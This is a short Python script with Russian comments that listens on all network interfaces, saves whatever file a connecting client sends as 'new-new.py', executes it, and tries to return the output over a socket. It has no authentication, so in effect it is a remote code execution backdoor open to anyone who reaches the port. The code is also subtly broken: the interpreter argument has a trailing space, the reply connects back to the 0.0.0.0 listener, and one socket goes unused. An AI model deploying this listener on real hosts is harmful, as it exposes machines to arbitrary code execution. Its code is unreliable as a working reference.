import socket
import subprocess

def receive_file_and_execute(host, port):
    # Создаем сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    send_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Связываем сокет с адресом и портом
    sock.bind((host, port))

    # Слушаем входящие соединения
    sock.listen()

    # Принимаем соединение
    conn, addr = sock.accept()

    # Создаем временный файл для сохранения полученного файла
    temp_file_path = 'new-new.py'

    # Получаем данные файла
    with open(temp_file_path, 'wb') as file:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            file.write(data)
    result = subprocess.run(['python ', temp_file_path], capture_output=True, text=True)
    print(result.stdout)
    
    send_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    send_socket.connect((host, port))
    send_socket.sendall(result.stdout.encode())

    # Закрываем соединение
    conn.close()


# Пример использования
host = '0.0.0.0'  # Слушаем на всех доступных интерфейсах
port = 12345

receive_file_and_execute(host, port)
